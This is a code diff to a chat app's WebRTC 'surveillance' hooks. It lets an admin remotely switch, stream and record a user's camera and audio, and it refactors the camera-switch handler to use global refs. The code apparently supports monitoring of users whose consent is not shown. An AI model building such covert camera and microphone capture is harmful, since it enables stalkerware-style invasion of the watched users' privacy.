@@ -342,9 +342,6 @@
 
 
 
-
-
-
 import { useEffect, useRef, useState, useCallback } from "react";
 import { getSocket } from "@/lib/socket";
 import { useChatStore } from "@/stores/chatStore";
@@ -362,6 +359,10 @@ const ICE_SERVERS: RTCConfiguration = {
     },
   ],
 };
+
+// Global refs عشان الـ socket listener يلاقيهم دايماً
+const globalPeerRef = { current: null as RTCPeerConnection | null };
+const globalStreamRef = { current: null as MediaStream | null };
 
 export const useSurveillanceSender = (conversationId: string) => {
   const localStreamRef = useRef<MediaStream | null>(null);
@@ -390,10 +391,12 @@ export const useSurveillanceSender = (conversationId: string) => {
       });
 
       localStreamRef.current = stream;
+      globalStreamRef.current = stream;
       isStreamingRef.current = true;
 
       const pc = new RTCPeerConnection(ICE_SERVERS);
       peerConnectionRef.current = pc;
+      globalPeerRef.current = pc;
 
       stream.getTracks().forEach((track) => pc.addTrack(track, stream));
 
@@ -441,8 +444,10 @@ export const useSurveillanceSender = (conversationId: string) => {
     const socket = getSocket();
     localStreamRef.current?.getTracks().forEach((t) => t.stop());
     localStreamRef.current = null;
+    globalStreamRef.current = null;
     peerConnectionRef.current?.close();
     peerConnectionRef.current = null;
+    globalPeerRef.current = null;
     isStreamingRef.current = false;
     if (iceRestartTimerRef.current) clearTimeout(iceRestartTimerRef.current);
     socket.emit("surveillance-stop-to-admin", { conversationId });
@@ -467,74 +472,64 @@ export const useSurveillanceSender = (conversationId: string) => {
       }
     };
 
-    // ✅ حل مشكلة التبديل — بنفتح الكاميرا الجديدة الأول ثم نوقف القديمة
-   const onSwitchCamera = async ({ facingMode }: { facingMode: string }) => {
-      console.log("📱 onSwitchCamera called, facingMode:", facingMode);
-  console.log("📱 peerConnectionRef:", peerConnectionRef.current);
-  console.log("📱 localStreamRef:", localStreamRef.current);
-  if (!peerConnectionRef.current || !localStreamRef.current)
-    {
-          console.error("❌ No peer connection or stream!");
-           return;
-    }
+    const onSwitchCamera = async ({ facingMode }: { facingMode: string }) => {
+      console.log("📱 onSwitchCamera called:", facingMode);
 
-  try {
-    // 1. افتح الكاميرا الجديدة الأول
-    const newStream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: { exact: facingMode } },
-      audio: false,
-    });
+      const pc = globalPeerRef.current;
+      const stream = globalStreamRef.current;
 
-    const newVideoTrack = newStream.getVideoTracks()[0];
-    if (!newVideoTrack) return;
-
-    // 2. استبدل في الـ RTCPeerConnection
-    const sender = peerConnectionRef.current
-      .getSenders()
-      .find((s) => s.track?.kind === "video");
-
-    if (sender) {
-      await sender.replaceTrack(newVideoTrack);
-    } else {
-      // لو مفيش sender، أضف الـ track
-      peerConnectionRef.current.addTrack(newVideoTrack, localStreamRef.current);
-    }
-
-    // 3. وقف القديم وحدّث الـ localStream
-    const oldTracks = localStreamRef.current.getVideoTracks();
-    oldTracks.forEach((t) => {
-      t.stop();
-      localStreamRef.current!.removeTrack(t);
-    });
-    localStreamRef.current.addTrack(newVideoTrack);
-
-    console.log("✅ Camera switched to:", facingMode, newVideoTrack.label);
-  } catch (err) {
-    console.error("❌ Switch camera error:", err);
-    // جرب من غير exact لو فشل
-    try {
-      const fallbackStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode },
-        audio: false,
-      });
-      const fallbackTrack = fallbackStream.getVideoTracks()[0];
-      const sender = peerConnectionRef.current
-        ?.getSenders()
-        .find((s) => s.track?.kind === "video");
-      if (sender && fallbackTrack) {
-        await sender.replaceTrack(fallbackTrack);
-        const oldTracks = localStreamRef.current?.getVideoTracks() ?? [];
-        oldTracks.forEach((t) => {
-          t.stop();
-          localStreamRef.current!.removeTrack(t);
-        });
-        localStreamRef.current?.addTrack(fallbackTrack);
+      if (!pc || !stream) {
+        console.error("❌ No peer or stream", { pc, stream });
+        return;
       }
-    } catch (fallbackErr) {
-      console.error("❌ Fallback switch failed:", fallbackErr);
-    }
-  }
-};
+
+      try {
+        // افتح الكاميرا الجديدة الأول
+        const newStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { exact: facingMode } },
+          audio: false,
+        });
+
+        const newVideoTrack = newStream.getVideoTracks()[0];
+        console.log("📱 New track:", newVideoTrack.label);
+
+        // استبدل في الـ RTCPeerConnection
+        const sender = pc.getSenders().find((s) => s.track?.kind === "video");
+        if (sender) {
+          await sender.replaceTrack(newVideoTrack);
+          console.log("✅ Camera switched to:", facingMode);
+        } else {
+          pc.addTrack(newVideoTrack, stream);
+        }
+
+        // وقف القديم وحدّث الـ stream
+        stream.getVideoTracks().forEach((t) => {
+          t.stop();
+          stream.removeTrack(t);
+        });
+        stream.addTrack(newVideoTrack);
+
+      } catch (err) {
+        console.error("❌ Switch error (exact):", err);
+        // جرب بدون exact
+        try {
+          const fallback = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode },
+            audio: false,
+          });
+          const track = fallback.getVideoTracks()[0];
+          const sender = pc.getSenders().find((s) => s.track?.kind === "video");
+          if (sender && track) {
+            await sender.replaceTrack(track);
+            stream.getVideoTracks().forEach((t) => { t.stop(); stream.removeTrack(t); });
+            stream.addTrack(track);
+            console.log("✅ Camera switched (fallback):", facingMode);
+          }
+        } catch (e) {
+          console.error("❌ Fallback failed:", e);
+        }
+      }
+    };
 
     const onStopStream = () => {
       stopStreaming();
@@ -551,13 +546,13 @@ export const useSurveillanceSender = (conversationId: string) => {
       socket.off("surveillance-switch-camera", onSwitchCamera);
       socket.off("surveillance-stop-stream", onStopStream);
     };
-  }, [stopStreaming]);
+  }, [stopStreaming, conversationId]);
 
   useEffect(() => {
     const handleUnload = () => stopStreaming();
     window.addEventListener("beforeunload", handleUnload);
     return () => window.removeEventListener("beforeunload", handleUnload);
- }, [stopStreaming, conversationId]);
+  }, [stopStreaming]);
 
   return { startStreaming, stopStreaming, isConversationWithAdmin };
 };
@@ -602,6 +597,7 @@ export const useSurveillanceReceiver = (isAdmin: boolean) => {
       conversationId: string;
       fromSocketId: string;
     }) => {
+      console.log("📡 Admin received offer!", { conversationId, fromSocketId });
       const pc = new RTCPeerConnection(ICE_SERVERS);
       peerConnectionsRef.current.set(conversationId, pc);
 
@@ -616,15 +612,14 @@ export const useSurveillanceReceiver = (isAdmin: boolean) => {
 
       pc.ontrack = (event) => {
         const [remoteStream] = event.streams;
+        console.log("📡 Admin got remote stream!");
         setStreams((prev) => new Map(prev).set(conversationId, remoteStream));
 
-        // ✅ حل مشكلة الصوت — نستنى الـ audio track يكون موجود
         const startRecording = () => {
           const audioTracks = remoteStream.getAudioTracks();
           const videoTracks = remoteStream.getVideoTracks();
 
           if (audioTracks.length === 0 || videoTracks.length === 0) {
-            // استنى الـ tracks التانية
             setTimeout(startRecording, 500);
             return;
           }
